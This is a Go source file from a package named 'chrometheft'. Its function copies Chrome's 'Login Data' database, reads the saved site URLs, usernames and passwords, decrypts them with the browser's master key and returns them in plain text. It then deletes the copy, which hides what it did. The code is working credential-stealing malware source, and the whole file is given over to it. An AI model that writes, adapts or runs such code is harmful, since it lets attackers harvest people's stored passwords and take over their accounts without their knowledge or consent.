package chrometheft

import (
	"database/sql"
	"errors"
	"os"

	_ "github.com/mattn/go-sqlite3"
)

type Password struct {
	URL      string `json:"url"`
	Username string `json:"username"`
	Password string `json:"password"`
}

func GetPasswords(path string) ([]Password, error) {
	passwords := make([]Password, 0)

	dbFile := path + "\\User Data\\Default\\Login Data"
	if !fileExists(dbFile) {
		return passwords, errors.New("Login Data file not found")
	}

	// make a copy of the login data file
	copyFile(dbFile, dbFile+".bak")
	dbFile += ".bak"

	// open the login data file
	db, err := sql.Open("sqlite3", dbFile)
	if err != nil {
		return passwords, err
	}

	// select rows from the login data file
	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
	if err != nil {
		return passwords, err
	}
	defer func() {
		// clean up
		rows.Close()
		db.Close()
		os.Remove(dbFile)
	}()

	masterKey, err := GetMasterKey(path)

	// iterate over the rows
	for rows.Next() {
		var url, username, password string
		err = rows.Scan(&url, &username, &password)
		if err != nil {
			continue // make sure to iterate over all rows
		}

		password, err = DecryptEncryptedData(password, masterKey)

		if url != "" && username != "" && password != "" {
			passwords = append(passwords, Password{URL: url, Username: username, Password: password})
		}
	}

	return passwords, nil
}
